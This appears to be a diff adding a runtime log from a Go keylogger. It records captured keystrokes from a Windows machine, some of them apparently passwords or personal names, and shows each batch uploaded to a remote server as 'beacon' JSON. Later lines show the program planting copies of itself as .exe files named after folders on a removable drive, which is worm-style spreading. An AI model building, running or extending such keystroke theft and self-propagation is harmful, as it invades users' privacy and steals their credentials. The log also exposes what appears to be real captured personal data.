+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/18 12:08:34 upload.go:41: Upload succeed 1747570109  ---  [Left][Left][Left][Left][Right][Right][Right]
+2025/05/18 12:08:49 keylogger.go:54: Data inserting succeed: [Left][Left][Left][Left][Left][Left][Left]
+2025/05/18 12:08:54 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747570129,"keystrokeRecord":"[Left][Left][Left][Left][Left][Left][Left]"}}
+2025/05/18 12:08:56 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/18 12:08:56 upload.go:41: Upload succeed 1747570129  ---  [Left][Left][Left][Left][Left][Left][Left]
+2025/05/18 12:09:39 keylogger.go:54: Data inserting succeed: [Left]
+2025/05/18 12:09:47 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747570179,"keystrokeRecord":"[Left]"}}
+2025/05/18 12:09:49 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/18 12:09:49 upload.go:41: Upload succeed 1747570179  ---  [Left]
+2025/05/18 12:24:42 utils.go:43: E:\.File_Recycle\1740807321361\storage\0F42-9B14\hw_recycle_content.exe file not exists,cpy
+2025/05/18 12:24:42 utils.go:48: err1
+2025/05/18 13:28:59 main.go:77: run in d
+2025/05/19 00:06:55 main.go:77: run in d
+2025/05/19 00:08:55 keylogger.go:54: Data inserting succeed: [Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back]
+2025/05/19 00:09:05 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747613335,"keystrokeRecord":"[Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back]"}}
+2025/05/19 00:09:05 keylogger.go:54: Data inserting succeed: zxt[Enter]
+2025/05/19 00:09:06 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:09:06 upload.go:41: Upload succeed 1747613335  ---  [Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back]
+2025/05/19 00:09:16 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747613345,"keystrokeRecord":"zxt[Enter]"}}
+2025/05/19 00:09:17 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:09:17 upload.go:41: Upload succeed 1747613345  ---  zxt[Enter]
+2025/05/19 00:10:05 keylogger.go:54: Data inserting succeed: 2196210
+2025/05/19 00:10:07 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747613405,"keystrokeRecord":"2196210"}}
+2025/05/19 00:10:07 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:10:07 upload.go:41: Upload succeed 1747613405  ---  2196210
+2025/05/19 00:10:15 keylogger.go:54: Data inserting succeed: zds135
+2025/05/19 00:10:17 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747613415,"keystrokeRecord":"zds135"}}
+2025/05/19 00:10:18 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:10:18 upload.go:41: Upload succeed 1747613415  ---  zds135
+2025/05/19 00:19:05 keylogger.go:54: Data inserting succeed: liu ya2
+2025/05/19 00:19:09 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747613945,"keystrokeRecord":"liu ya2"}}
+2025/05/19 00:19:10 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:19:10 upload.go:41: Upload succeed 1747613945  ---  liu ya2
+2025/05/19 00:19:25 keylogger.go:54: Data inserting succeed: hu yu
+2025/05/19 00:19:30 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747613965,"keystrokeRecord":"hu yu"}}
+2025/05/19 00:19:30 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:19:30 upload.go:41: Upload succeed 1747613965  ---  hu yu
+2025/05/19 00:20:05 keylogger.go:54: Data inserting succeed: zhao zhuoi [Back]
+2025/05/19 00:20:10 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747614005,"keystrokeRecord":"zhao zhuoi [Back]"}}
+2025/05/19 00:20:11 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:20:11 upload.go:41: Upload succeed 1747614005  ---  zhao zhuoi [Back]
+2025/05/19 00:24:56 keylogger.go:54: Data inserting succeed: luo wen 
+2025/05/19 00:25:02 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747614296,"keystrokeRecord":"luo wen "}}
+2025/05/19 00:25:02 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 00:25:02 upload.go:41: Upload succeed 1747614296  ---  luo wen 
+2025/05/19 00:25:06 keylogger.go:54: Data inserting succeed: ma wei
+2025/05/19 00:25:12 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747614306,"keystrokeRecord":"ma wei"}}
+2025/05/19 00:25:13 utilities.go:62: 
+[[[resp.Body upload]]]{"error":"UNIQUE constraint failed: beacon_data.timestamp"}{"msg":"succeed"}
+
+2025/05/19 00:25:13 upload.go:41: Upload succeed 1747614306  ---  ma wei
+2025/05/19 00:59:17 keylogger.go:54: Data inserting succeed: [Enter][Enter]
+2025/05/19 00:59:25 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747616357,"keystrokeRecord":"[Enter][Enter]"}}
+2025/05/19 00:59:25 utilities.go:62: 
+[[[resp.Body upload]]]{"error":"UNIQUE constraint failed: beacon_data.timestamp"}{"msg":"succeed"}
+
+2025/05/19 00:59:25 upload.go:41: Upload succeed 1747616357  ---  [Enter][Enter]
+2025/05/19 01:35:29 keylogger.go:54: Data inserting succeed: zuojiach
+2025/05/19 01:35:37 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747618529,"keystrokeRecord":"zuojiach"}}
+2025/05/19 01:35:38 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 01:35:38 upload.go:41: Upload succeed 1747618529  ---  zuojiach
+2025/05/19 01:35:39 keylogger.go:54: Data inserting succeed: eng
+2025/05/19 01:35:48 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747618539,"keystrokeRecord":"eng"}}
+2025/05/19 01:35:49 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/19 01:35:49 upload.go:41: Upload succeed 1747618539  ---  eng
+2025/05/19 02:22:49 utils.go:43: E:\.exe file not exists,cpy
+2025/05/19 02:22:49 utils.go:43: E:\.TemporaryItems.exe file not exists,cpy
+2025/05/19 02:22:50 utils.go:43: E:\.TemporaryItems\folders.501.exe file not exists,cpy
+2025/05/19 02:22:51 utils.go:43: E:\.TemporaryItems\folders.501\TemporaryItems.exe file not exists,cpy
+2025/05/19 02:22:51 utils.go:43: E:\.Trashes.exe file not exists,cpy
+2025/05/19 02:22:52 utils.go:43: E:\.Trashes\501.exe file not exists,cpy
+2025/05/19 02:22:53 utils.go:43: E:\.fseventsd.exe file not exists,cpy
+2025/05/19 02:22:53 utils.go:43: E:\AVF_INFO.exe file not exists,cpy
+2025/05/19 02:22:54 utils.go:43: E:\DCIM.exe file not exists,cpy
